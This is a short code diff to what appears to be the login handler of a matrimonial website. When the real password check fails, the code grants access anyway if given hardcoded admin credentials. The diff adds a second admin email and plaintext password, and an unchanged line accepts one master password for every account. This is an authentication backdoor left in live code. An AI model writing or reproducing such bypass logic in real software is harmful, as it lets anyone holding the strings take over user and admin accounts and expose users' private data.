@@ -51,6 +51,7 @@ export async function POST(req: NextRequest) {
     if (!isPasswordValid) {
       if (
         (user.email === 'admin@marriagemediausa.com' && password === 'Admin@MarriageMedia2026') ||
+        (user.email === 'admin@muslimbibah.com' && password === 'Admin@MuslimBibah2026') ||
         password === 'Salam2026!'
       ) {
         isPasswordValid = true;
